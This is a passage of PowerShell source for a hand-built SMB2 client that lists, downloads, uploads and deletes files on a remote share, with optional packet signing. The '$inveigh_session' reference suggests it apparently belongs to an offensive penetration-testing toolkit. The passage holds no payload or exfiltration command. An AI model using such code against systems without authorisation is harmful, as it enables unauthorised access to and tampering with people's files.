                            $SMB2_signature = $HMAC_SHA256.ComputeHash($SMB2_sign)

                            $SMB2_signature = $SMB2_signature[0..15]

                            $packet_SMB2c_header["Signature"] = $SMB2_signature

                            $SMB2c_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2c_header

                        }

                        $client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data + $SMB2b_header + $SMB2b_data + $SMB2c_header + $SMB2c_data

                        $client_stream.Write($client_send,0,$client_send.Length) > $null

                        $client_stream.Flush()

                        $client_stream.Read($client_receive,0,$client_receive.Length) > $null

                        if($Action -eq 'Delete')

                        {

                            $stage = 'CreateRequest'

                            $file = [System.Text.Encoding]::Unicode.GetBytes($share_subdirectory)

                            $action_step++

                        }

                        else

                        {

                            $stage = 'ParseDirectoryContents'

                        }

                    }

                    'FindRequest'

                    {

                        $file_ID = $client_receive[132..147]

                        $message_ID++

                        $packet_SMB2_header = New-PacketSMB2Header 0x0e,0x00 0x01,0x00 $SMB_signing $message_ID $process_ID $tree_ID $session_ID

                        $packet_SMB2_header["NextCommand"] = 0x68,0x00,0x00,0x00

                        $packet_SMB2_data = New-PacketSMB2FindRequestFile $file_ID 0x00,0x00,0x00,0x00,0x00,0x00

                        $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header

                        $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data    

                        if($SMB_signing)

                        {

                            $SMB2_sign = $SMB2_header + $SMB2_data 

                            $SMB2_signature = $HMAC_SHA256.ComputeHash($SMB2_sign)

                            $SMB2_signature = $SMB2_signature[0..15]

                            $packet_SMB2_header["Signature"] = $SMB2_signature

                            $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header

                        }

                        $message_ID++

                        $packet_SMB2b_header = New-PacketSMB2Header 0x0e,0x00 0x01,0x00 $SMB_signing $message_ID $process_ID $tree_ID $session_ID

                        if($SMB_signing)

                        {

                            $packet_SMB2b_header["Flags"] = 0x0c,0x00,0x00,0x00      

                        }

                        else

                        {

                            $packet_SMB2b_header["Flags"] = 0x04,0x00,0x00,0x00

                        }

                        $packet_SMB2b_data = New-PacketSMB2FindRequestFile $file_ID

                        $packet_SMB2b_data["OutputBufferLength"] = 0x80,0x00,0x00,0x00

                        $SMB2b_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2b_header

                        $SMB2b_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2b_data    

                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService ($SMB2_header.Length + $SMB2b_header.Length)  ($SMB2_data.Length + $SMB2b_data.Length)

                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                        if($SMB_signing)

                        {

                            $SMB2_sign = $SMB2b_header + $SMB2b_data 

                            $SMB2_signature = $HMAC_SHA256.ComputeHash($SMB2_sign)

                            $SMB2_signature = $SMB2_signature[0..15]

                            $packet_SMB2b_header["Signature"] = $SMB2_signature

                            $SMB2b_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2b_header

                        }

                        $client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data + $SMB2b_header + $SMB2b_data

                        $client_stream.Write($client_send,0,$client_send.Length) > $null

                        $client_stream.Flush()

                        $client_stream.Read($client_receive,0,$client_receive.Length) > $null

                        if($Action -eq 'Get' -and $action_step -eq 1)

                        {

                            $find_response = [System.BitConverter]::ToString($client_receive)

                            $find_response = $find_response -replace "-",""

                            $file_unicode = [System.BitConverter]::ToString([System.Text.Encoding]::Unicode.GetBytes($source_file))

                            $file_unicode = $file_unicode -replace "-",""

                            $file_size_index = $find_response.IndexOf($file_unicode) - 128

                            $file_size = [System.BitConverter]::ToUInt32($client_receive[($file_size_index / 2)..($file_size_index / 2 + 7)],0)

                            $action_step++

                            $create_request_extra_info = 1

                            $stage = 'CreateRequest'

                            if($share_subdirectory -eq $file)

                            {

                                $file = [System.Text.Encoding]::Unicode.GetBytes($file)

                            }

                            else

                            {

                                $file = [System.Text.Encoding]::Unicode.GetBytes($share_subdirectory)

                            }

                        }

                        else

                        {

                            $stage = 'ParseDirectoryContents'

                        }

                    }

                    'IoctlRequest'

                    {

                        $tree_ID = $client_receive[40..43]

                        $ioctl_path = "\" + $Target + "\" + $Share

                        $ioctl_path_bytes = [System.Text.Encoding]::Unicode.GetBytes($ioctl_path) + 0x00,0x00

                        $message_ID++

                        $packet_SMB2_header = New-PacketSMB2Header 0x0b,0x00 0x01,0x00 $SMB_signing $message_ID $process_ID $tree_ID $session_ID

                        $packet_SMB2_data = New-PacketSMB2IoctlRequest $ioctl_path_bytes

                        $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header

                        $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data    

                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB2_header.Length $SMB2_data.Length

                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                        if($SMB_signing)

                        {

                            $SMB2_sign = $SMB2_header + $SMB2_data 

                            $SMB2_signature = $HMAC_SHA256.ComputeHash($SMB2_sign)

                            $SMB2_signature = $SMB2_signature[0..15]

                            $packet_SMB2_header["Signature"] = $SMB2_signature

                            $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header

                        }

                        $client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data

                        $client_stream.Write($client_send,0,$client_send.Length) > $null

                        $client_stream.Flush()

                        $client_stream.Read($client_receive,0,$client_receive.Length) > $null

                        $tree_ID = 0x00,0x00,0x00,0x00

                        $stage = 'TreeConnect'

                    }

                    'Logoff'

                    {

                        $message_ID++

                        $packet_SMB2_header = New-PacketSMB2Header 0x02,0x00 0x01,0x00 $SMB_signing $message_ID $process_ID $tree_ID $session_ID

                        $packet_SMB2_data = New-PacketSMB2SessionLogoffRequest

                        $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header

                        $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data

                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB2_header.Length $SMB2_data.Length

                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                        if($SMB_signing)

                        {

                            $SMB2_sign = $SMB2_header + $SMB2_data

                            $SMB2_signature = $HMAC_SHA256.ComputeHash($SMB2_sign)

                            $SMB2_signature = $SMB2_signature[0..15]

                            $packet_SMB2_header["Signature"] = $SMB2_signature

                            $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header

                        }

                        $client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data

                        $client_stream.Write($client_send,0,$client_send.Length) > $null

                        $client_stream.Flush()

                        $client_stream.Read($client_receive,0,$client_receive.Length) > $null

                        $stage = 'Exit'

                    }

                    'ParseDirectoryContents'

                    {

                        $subdirectory_list = New-Object System.Collections.ArrayList

                        $create_response_file = [System.BitConverter]::ToString($client_receive)

                        $create_response_file = $create_response_file -replace "-",""

                        $directory_contents_mode_list = New-Object System.Collections.ArrayList

                        $directory_contents_create_time_list = New-Object System.Collections.ArrayList

                        $directory_contents_last_write_time_list = New-Object System.Collections.ArrayList

                        $directory_contents_length_list = New-Object System.Collections.ArrayList

                        $directory_contents_name_list = New-Object System.Collections.ArrayList

                        if($directory_list.Count -gt 0)

                        {

                            $create_response_file_index = 152

                            $directory_list.RemoveAt(0) > $null

                        }

                        else

                        {

                            $create_response_file_index = $create_response_file.Substring(10).IndexOf("FE534D42") + 154

                        }

                        do

                        {

                            $SMB_next_offset = [System.BitConverter]::ToUInt32($client_receive[($create_response_file_index / 2 + $SMB_offset)..($create_response_file_index / 2 + 3 + $SMB_offset)],0)

                            $SMB_file_length = [System.BitConverter]::ToUInt32($client_receive[($create_response_file_index / 2 + 40 + $SMB_offset)..($create_response_file_index / 2 + 47 + $SMB_offset)],0)

                            $SMB_file_attributes = [Convert]::ToString($client_receive[($create_response_file_index / 2 + 56 + $SMB_offset)],2).PadLeft(16,'0')

                            if($SMB_file_length -eq 0)

                            {

                                $SMB_file_length = $null

                            }

                            if($SMB_file_attributes.Substring(11,1) -eq '1')

                            {

                                $SMB_file_mode = "d"

                            }

                            else

                            {

                                $SMB_file_mode = "-"

                            }

                            if($SMB_file_attributes.Substring(10,1) -eq '1')

                            {

                                $SMB_file_mode+= "a"

                            }

                            else

                            {

                                $SMB_file_mode+= "-"

                            }

                            if($SMB_file_attributes.Substring(15,1) -eq '1')

                            {

                                $SMB_file_mode+= "r"

                            }

                            else

                            {

                                $SMB_file_mode+= "-"

                            }

                            if($SMB_file_attributes.Substring(14,1) -eq '1')

                            {

                                $SMB_file_mode+= "h"

                            }

                            else

                            {

                                $SMB_file_mode+= "-"

                            }

                            if($SMB_file_attributes.Substring(13,1) -eq '1')

                            {

                                $SMB_file_mode+= "s"

                            }

                            else

                            {

                                $SMB_file_mode+= "-"

                            }

                            $file_create_time = [Datetime]::FromFileTime([System.BitConverter]::ToInt64($client_receive[($create_response_file_index / 2 + 8 + $SMB_offset)..($create_response_file_index / 2 + 15 + $SMB_offset)],0))

                            $file_create_time = Get-Date $file_create_time -format 'M/d/yyyy h:mm tt'

                            $file_last_write_time = [Datetime]::FromFileTime([System.BitConverter]::ToInt64($client_receive[($create_response_file_index / 2 + 24 + $SMB_offset)..($create_response_file_index / 2 + 31 + $SMB_offset)],0))

                            $file_last_write_time = Get-Date $file_last_write_time -format 'M/d/yyyy h:mm tt'

                            $SMB_filename_length = [System.BitConverter]::ToUInt32($client_receive[($create_response_file_index / 2 + 60 + $SMB_offset)..($create_response_file_index / 2 + 63 + $SMB_offset)],0)

                            $SMB_filename_unicode = $client_receive[($create_response_file_index / 2 + 104 + $SMB_offset)..($create_response_file_index / 2 + 104 + $SMB_offset + $SMB_filename_length - 1)]

                            $SMB_filename = [System.BitConverter]::ToString($SMB_filename_unicode)

                            $SMB_filename = $SMB_filename -replace "-00",""

                            if($SMB_filename.Length -gt 2)

                            {

                                $SMB_filename = $SMB_filename.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}

                                $SMB_filename_extract = New-Object System.String ($SMB_filename,0,$SMB_filename.Length)

                            }

                            else

                            {

                                $SMB_filename_extract = [String][Char][System.Convert]::ToInt16($SMB_filename,16)

                            }

                            if(!$Modify)

                            {

                                $file_last_write_time = $file_last_write_time.PadLeft(19,0)

                                [String]$SMB_file_length = $SMB_file_length

                                $SMB_file_length = $SMB_file_length.PadLeft(15,0)

                            }

                            if($SMB_file_attributes.Substring(11,1) -eq '1')

                            {

                                if($SMB_filename_extract -ne '.' -and $SMB_filename_extract -ne '..')

                                {

                                    $subdirectory_list.Add($SMB_filename_unicode) > $null

                                    $directory_contents_name_list.Add($SMB_filename_extract) > $null

                                    $directory_contents_mode_list.Add($SMB_file_mode) > $null

                                    $directory_contents_length_list.Add($SMB_file_length) > $null

                                    $directory_contents_last_write_time_list.Add($file_last_write_time) > $null

                                    $directory_contents_create_time_list.Add($file_create_time) > $null

                                }

                            }

                            else

                            {

                                $directory_contents_name_list.Add($SMB_filename_extract) > $null

                                $directory_contents_mode_list.Add($SMB_file_mode) > $null

                                $directory_contents_length_list.Add($SMB_file_length) > $null

                                $directory_contents_last_write_time_list.Add($file_last_write_time) > $null

                                $directory_contents_create_time_list.Add($file_create_time) > $null

                            }

                            if($share_subdirectory -and !$share_subdirectory_start)

                            {

                                $root_directory_string = $share_subdirectory + '\'

                            }

                            $SMB_offset += $SMB_next_offset

                        }

                        until($SMB_next_offset -eq 0)

                        if($directory_contents_name_list)

                        {

                            if($root_directory_string)

                            {

                                $file_directory = $target_share + "\" + $root_directory_string.Substring(0,$root_directory_string.Length - 1)

                            }

                            else

                            {

                                $file_directory = $target_share

                            }

                        }

                        $directory_contents_output = @()

                        $i = 0

                        ForEach($directory in $directory_contents_name_list)

                        {

                            $directory_object = New-Object PSObject

                            Add-Member -InputObject $directory_object -MemberType NoteProperty -Name Name -Value ($file_directory + "\" + $directory_contents_name_list[$i])

                            Add-Member -InputObject $directory_object -MemberType NoteProperty -Name Mode -Value $directory_contents_mode_list[$i]

                            Add-Member -InputObject $directory_object -MemberType NoteProperty -Name Length -Value $directory_contents_length_list[$i]

                            if($Modify)

                            {

                                Add-Member -InputObject $directory_object -MemberType NoteProperty -Name CreateTime -Value $directory_contents_create_time_list[$i]

                            }

                            Add-Member -InputObject $directory_object -MemberType NoteProperty -Name LastWriteTime -Value $directory_contents_last_write_time_list[$i]

                            $directory_contents_output += $directory_object

                            $i++

                        }

                        if($directory_contents_output -and !$Modify)

                        {

                            if($directory_contents_hide_headers)

                            {

                                ($directory_contents_output | Format-Table -Property @{ Name="Mode"; Expression={$_.Mode }; Alignment="left"; },

                                                                            @{ Name="LastWriteTime"; Expression={$_.LastWriteTime }; Alignment="right"; },

                                                                            @{ Name="Length"; Expression={$_.Length }; Alignment="right"; },

                                                                            @{ Name="Name"; Expression={$_.Name }; Alignment="left"; } -AutoSize -HideTableHeaders -Wrap| Out-String).Trim()

                            }

                            else

                            {

                                $directory_contents_hide_headers = $true

                                ($directory_contents_output | Format-Table -Property @{ Name="Mode"; Expression={$_.Mode }; Alignment="left"; },

                                                                            @{ Name="LastWriteTime"; Expression={$_.LastWriteTime }; Alignment="right"; },

                                                                            @{ Name="Length"; Expression={$_.Length }; Alignment="right"; },

                                                                            @{ Name="Name"; Expression={$_.Name }; Alignment="left"; } -AutoSize -Wrap| Out-String).Trim()

                            }

                        }

                        else

                        {

                            $directory_contents_output

                        }

                        $subdirectory_list.Reverse() > $null

                        ForEach($subdirectory in $subdirectory_list)

                        {  

                            $directory_list.Insert(0,($root_directory + $subdirectory)) > $null

                        }

                        $SMB_offset = 0

                        $stage = 'CloseRequest'

                    }

                    'QueryInfoRequest'

                    {

                        $message_ID++

                        $packet_SMB2_header = New-PacketSMB2Header 0x10,0x00 0x01,0x00 $SMB_signing $message_ID $process_ID $tree_ID $session_ID

                        $packet_SMB2_header["NextCommand"] = $header_next_command

                        $packet_SMB2_data = New-PacketSMB2QueryInfoRequest $query_info_request_info_type_1 $query_info_request_file_info_class_1 $query_info_request_output_buffer_length_1 $query_info_request_input_buffer_offset_1 $file_ID $query_info_request_buffer_1

                        $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header

                        $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data    

                        if($SMB_signing)

                        {

                            $SMB2_sign = $SMB2_header + $SMB2_data 

                            $SMB2_signature = $HMAC_SHA256.ComputeHash($SMB2_sign)

                            $SMB2_signature = $SMB2_signature[0..15]

                            $packet_SMB2_header["Signature"] = $SMB2_signature

                            $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header

                        }

                        $message_ID++

                        $packet_SMB2b_header = New-PacketSMB2Header 0x10,0x00 0x01,0x00 $SMB_signing $message_ID $process_ID $tree_ID $session_ID

                        if($SMB_signing)

                        {

                            $packet_SMB2b_header["Flags"] = 0x0c,0x00,0x00,0x00      

                        }

                        else

                        {

                            $packet_SMB2b_header["Flags"] = 0x04,0x00,0x00,0x00

                        }

                        $packet_SMB2b_data = New-PacketSMB2QueryInfoRequest $query_info_request_info_type_2 $query_info_request_file_info_class_2 $query_info_request_output_buffer_length_2 $query_info_request_input_buffer_offset_2 $file_ID $query_info_request_buffer_2

                        $SMB2b_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2b_header

                        $SMB2b_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2b_data

                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService ($SMB2_header.Length + $SMB2b_header.Length)  ($SMB2_data.Length + $SMB2b_data.Length)

                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                        if($SMB_signing)

                        {

                            $SMB2_sign = $SMB2b_header + $SMB2b_data 

                            $SMB2_signature = $HMAC_SHA256.ComputeHash($SMB2_sign)

                            $SMB2_signature = $SMB2_signature[0..15]

                            $packet_SMB2b_header["Signature"] = $SMB2_signature

                            $SMB2b_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2b_header

                        }

                        $client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data + $SMB2b_header + $SMB2b_data

                        $client_stream.Write($client_send,0,$client_send.Length) > $null

                        $client_stream.Flush()

                        $client_stream.Read($client_receive,0,$client_receive.Length) > $null

                        if($share_subdirectory_start)

                        {

                            $file = [System.Text.Encoding]::Unicode.GetBytes($share_subdirectory)

                            $root_directory = $file + 0x5c,0x00

                            $create_request_extra_info = 1

                            $stage = 'CreateRequest'

                        }

                        elseif($Action -eq 'Get')

                        {

                            switch($action_step)

                            {

                                5

                                {

                                    $query_info_response = [System.BitConverter]::ToString($client_receive)

                                    $query_info_response = $query_info_response -replace "-",""

                                    $file_stream_size_index = $query_info_response.Substring(10).IndexOf("FE534D42") + 170

                                    $file_stream_size = [System.BitConverter]::ToUInt32($client_receive[($file_stream_size_index / 2)..($file_stream_size_index / 2 + 8)],0)

                                    $file_stream_size_quotient = [Math]::Truncate($file_stream_size / 65536)

                                    $file_stream_size_remainder = $file_stream_size % 65536

                                    $percent_complete = $file_stream_size_quotient

                                    if($file_stream_size_remainder -ne 0)

                                    {

                                        $percent_complete++

                                    }

                                    if($file_stream_size -lt 1024)

                                    {

                                        $progress_file_size = "" + $file_stream_size + "B"

                                    }

                                    elseif($file_stream_size -lt 1024000)

                                    {

                                        $progress_file_size = "" + ($file_stream_size / 1024).ToString('.00') + "KB"

                                    }

                                    else

                                    {

                                        $progress_file_size = "" + ($file_stream_size / 1024000).ToString('.00') + "MB"

                                    }

                                    $header_next_command = 0x70,0x00,0x00,0x00

                                    $query_info_request_info_type_1 = 0x02

                                    $query_info_request_file_info_class_1 = 0x01

                                    $query_info_request_output_buffer_length_1 = 0x58,0x00,0x00,0x00

                                    $query_info_request_input_buffer_offset_1 = 0x00,0x00

                                    $query_info_request_buffer_1 = 8

                                    $query_info_request_info_type_2 = 0x02

                                    $query_info_request_file_info_class_2 = 0x05

                                    $query_info_request_output_buffer_length_2 = 0x50,0x00,0x00,0x00

                                    $query_info_request_input_buffer_offset_2 = 0x00,0x00

                                    $query_info_request_buffer_2 = 1

                                    $action_step++

                                    $stage = 'QueryInfoRequest'

                                }

                                6

                                {

                                    if($file_stream_size -lt 65536)

                                    {

                                        $read_request_length = $file_stream_size

                                    }

                                    else

                                    {

                                        $read_request_length = 65536

                                    }

                                    $read_request_offset = 0

                                    $read_request_step = 1

                                    $action_step++

                                    $stage = 'ReadRequest'

                                }

                            }

                        }

                        elseif($Action -eq 'Put')

                        {

                            $percent_complete = $source_file_size_quotient

                            if($source_file_size_remainder -ne 0)

                            {

                                $percent_complete++

                            }

                            if($source_file_size -lt 1024)

                            {

                                $progress_file_size = "" + $source_file_size + "B"

                            }

                            elseif($source_file_size -lt 1024000)

                            {

                                $progress_file_size = "" + ($source_file_size / 1024).ToString('.00') + "KB"

                            }

                            else

                            {

                                $progress_file_size = "" + ($source_file_size / 1024000).ToString('.00') + "MB"

                            }

                            $action_step++

                            $set_info_request_file_info_class = 0x01

                            $set_info_request_info_level = 0x14

                            $set_info_request_buffer = [System.BitConverter]::GetBytes($source_file_size)

                            $stage = 'SetInfoRequest'

                        }

                        elseif($Action -eq 'Delete')

                        {

                            $stage = 'CreateRequest'

                        }

                        else

                        {

                            $stage = 'CreateRequestFindRequest'

                        }

                    }

                    'ReadRequest'

                    {

                        $message_ID++

                        $packet_SMB2_header = New-PacketSMB2Header 0x08,0x00 0x01,0x00 $SMB_signing $message_ID $process_ID $tree_ID $session_ID

                        $packet_SMB2_data = New-PacketSMB2ReadRequest $read_request_length $read_request_offset $file_ID

                        $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header

                        $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data 

                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB2_header.Length $SMB2_data.Length

                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                        if($SMB_signing)

                        {

                            $SMB2_sign = $SMB2_header + $SMB2_data 

                            $SMB2_signature = $HMAC_SHA256.ComputeHash($SMB2_sign)

                            $SMB2_signature = $SMB2_signature[0..15]

                            $packet_SMB2_header["Signature"] = $SMB2_signature

                            $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header

                        }

                        $client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data 

                        $client_stream.Write($client_send,0,$client_send.Length) > $null

                        $client_stream.Flush()

                        Start-Sleep -m 5

                        if($read_request_length -eq 65536)

                        {

                            $i = 0

                            while($client.Available -lt 8192 -and $i -lt 10)

                            {

                                Start-Sleep -m $Sleep

                                $i++

                            }

                        }

                        else

                        {

                            Start-Sleep -m $Sleep

                        }

                        $client_stream.Read($client_receive,0,$client_receive.Length) > $null

                        if($Action -eq 'Get' -and $action_step -eq 3)

                        {

                            $action_step++

                            $create_request_extra_info = 1

                            $stage = 'CreateRequest'

                        }

                        elseif($Action -eq 'Get' -and $action_step -eq 7)

                        {

                            if(!$NoProgress)

                            {

                                $percent_complete_calculation = [Math]::Truncate($read_request_step / $percent_complete * 100)

                                Write-Progress -Activity "Downloading $source_file - $progress_file_size" -Status "$percent_complete_calculation% Complete:" -PercentComplete $percent_complete_calculation

                            }

                            $file_bytes = $client_receive[84..($read_request_length + 83)]

                            if(!$Modify)

                            {

                                if(!$file_write)

                                {

                                    $file_write = New-Object 'System.IO.FileStream' $destination_path,'Append','Write','Read'

                                }

                                $file_write.Write($file_bytes,0,$file_bytes.Count)

                            }

                            else

                            {

                                $file_memory.AddRange($file_bytes)

                            }

                            if($read_request_step -lt $file_stream_size_quotient)

                            {

                                $read_request_offset+=65536

                                $read_request_step++

                                $stage = 'ReadRequest'

                            }

                            elseif($read_request_step -eq $file_stream_size_quotient -and $file_stream_size_remainder -ne 0)

                            {

                                $read_request_length = $file_stream_size_remainder

                                $read_request_offset+=65536

                                $read_request_step++

                                $stage = 'ReadRequest'

                            }

                            else

                            {

                                if(!$Modify)

                                {

                                    $file_write.Close()

                                }

                                else

                                {

                                    [Byte[]]$file_memory = $file_memory

                                    ,$file_memory

                                }

                                $output_message = "[+] File downloaded"

                                $stage = 'CloseRequest'

                            }

                        }

                        elseif([System.BitConverter]::ToString($client_receive[12..15]) -ne '03-01-00-00')

                        {

                            $stage = 'CloseRequest'

                        }

                        else

                        {

                            $stage = 'CloseRequest'

                        }

                    }

                    'SetInfoRequest'

                    {

                        $message_ID++

                        $packet_SMB2_header = New-PacketSMB2Header 0x11,0x00 0x01,0x00 $SMB_signing $message_ID $process_ID $tree_ID $session_ID

                        $packet_SMB2_data = New-PacketSMB2SetInfoRequest $set_info_request_file_info_class $set_info_request_info_level $file_ID $set_info_request_buffer

                        $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header

                        $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data    

                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB2_header.Length $SMB2_data.Length

                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                        if($SMB_signing)

                        {

                            $SMB2_sign = $SMB2_header + $SMB2_data 

                            $SMB2_signature = $HMAC_SHA256.ComputeHash($SMB2_sign)

                            $SMB2_signature = $SMB2_signature[0..15]

                            $packet_SMB2_header["Signature"] = $SMB2_signature

                            $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header

                        }

                        $client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data

                        $client_stream.Write($client_send,0,$client_send.Length) > $null

                        $client_stream.Flush()

                        $client_stream.Read($client_receive,0,$client_receive.Length) > $null

                        if($source_file_size -le 65536)

                        {

                            $write_request_length = $source_file_size

                        }

                        else

                        {

                            $write_request_length = 65536

                        }

                        $write_request_offset = 0

                        $write_request_step = 1

                        if($Action -eq 'Delete')

                        {

                            $output_message = "[+] File deleted"

                            $stage = 'CloseRequest'

                            $action_step++

                        }

                        elseif($Action -eq 'Put' -and $action_step -eq 4)

                        {

                            $output_message = "[+] File uploaded"

                            $stage = 'CloseRequest'

                        }

                        else

                        {

                            $stage = 'WriteRequest'

                        }

                    }

                    'TreeConnect'

                    {

                        $message_ID++

                        $packet_SMB2_header = New-PacketSMB2Header 0x03,0x00 0x1f,0x00 $SMB_signing $message_ID $process_ID $tree_ID $session_ID

                        $packet_SMB2_data = New-PacketSMB2TreeConnectRequest $path_bytes

                        $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header

                        $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data    

                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB2_header.Length $SMB2_data.Length

                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                        if($SMB_signing)

                        {

                            $SMB2_sign = $SMB2_header + $SMB2_data 

                            $SMB2_signature = $HMAC_SHA256.ComputeHash($SMB2_sign)

                            $SMB2_signature = $SMB2_signature[0..15]

                            $packet_SMB2_header["Signature"] = $SMB2_signature

                            $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header

                        }

                        $client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data

                        try

                        {

                            $client_stream.Write($client_send,0,$client_send.Length) > $null

                            $client_stream.Flush()

                            $client_stream.Read($client_receive,0,$client_receive.Length) > $null

                        }

                        catch

                        {

                            Write-Output "[-] Session connection is closed"

                            $stage = 'Exit'

                        }

                        if($stage -ne 'Exit')

                        {

                            if([System.BitConverter]::ToString($client_receive[12..15]) -ne '00-00-00-00')

                            {

                                $error_code = [System.BitConverter]::ToString($client_receive[12..15])

                                switch($error_code)

                                {

                                    'cc-00-00-c0'

                                    {

                                        $output_message = "[-] Share not found"

                                        $stage = 'Exit'

                                    }

                                    '22-00-00-c0'

                                    {

                                        $output_message = "[-] Access denied"

                                        $stage = 'Exit'

                                    }

                                    default

                                    {

                                        $error_code = $error_code -replace "-",""

                                        $output_message = "[-] Tree connect error code 0x$error_code"

                                        $stage = 'Exit'

                                    }

                                }

                            }

                            elseif($refresh)

                            {

                                Write-Output "[+] Session refreshed"

                                $stage = 'Exit'

                            }

                            elseif(!$SMB_IPC)

                            {

                                $SMB_share_path = "\\" + $Target + "\" + $Share

                                $path_bytes = [System.Text.Encoding]::Unicode.GetBytes($SMB_share_path)

                                $SMB_IPC = $true

                                $stage = 'IoctlRequest'

                                $file = ""

                            }

                            else

                            {

                                if($Action -eq 'Put')

                                {

                                    $file = [System.Text.Encoding]::Unicode.GetBytes($share_subdirectory)

                                    $create_request_extra_info = 2

                                }

                                else

                                {

                                    $create_request_extra_info = 1

                                }

                                $tree_ID = $client_receive[40..43]

                                $stage = 'CreateRequest'

                                if($Action -eq 'Get')

                                {

                                    $file = [System.Text.Encoding]::Unicode.GetBytes($share_subdirectory)

                                }

                            }

                        }

                    }

                    'TreeDisconnect'

                    {

                        $message_ID++

                        $packet_SMB2_header = New-PacketSMB2Header 0x04,0x00 0x01,0x00 $SMB_signing $message_ID $process_ID $tree_ID $session_ID

                        $packet_SMB2_data = New-PacketSMB2TreeDisconnectRequest

                        $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header

                        $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data

                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB2_header.Length $SMB2_data.Length

                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                        if($SMB_signing)

                        {

                            $SMB2_sign = $SMB2_header + $SMB2_data

                            $SMB2_signature = $HMAC_SHA256.ComputeHash($SMB2_sign)

                            $SMB2_signature = $SMB2_signature[0..15]

                            $packet_SMB2_header["Signature"] = $SMB2_signature

                            $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header

                        }

                        $client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data

                        $client_stream.Write($client_send,0,$client_send.Length) > $null

                        $client_stream.Flush()

                        $client_stream.Read($client_receive,0,$client_receive.Length) > $null

                        if($inveigh_session -and !$Logoff)

                        {

                            $stage = 'Exit'

                        }

                        else

                        {

                            $stage = 'Logoff'

                        }

                    }

                    'WriteRequest'

                    {

                        if(!$Modify)

                        {

                            $source_file_binary_reader.BaseStream.Seek($write_request_offset,"Begin") > $null

                            $source_file_binary_reader.Read($source_file_buffer,0,$source_file_buffer_size) > $null

                        }

                        else

                        {

                            $source_file_buffer = $Source[$write_request_offset..($write_request_offset+$write_request_length)]

                        }

                        $message_ID++

                        $packet_SMB2_header = New-PacketSMB2Header 0x09,0x00 0x01,0x00 $SMB_signing $message_ID $process_ID $tree_ID $session_ID

                        $packet_SMB2_header["CreditCharge"] = 0x01,0x00

                        $packet_SMB2_data = New-PacketSMB2WriteRequest $write_request_length $write_request_offset $file_ID $source_file_buffer

                        $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header

                        $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data 

                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB2_header.Length $SMB2_data.Length

                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                        if($SMB_signing)

                        {

                            $SMB2_sign = $SMB2_header + $SMB2_data 

                            $SMB2_signature = $HMAC_SHA256.ComputeHash($SMB2_sign)

                            $SMB2_signature = $SMB2_signature[0..15]

                            $packet_SMB2_header["Signature"] = $SMB2_signature

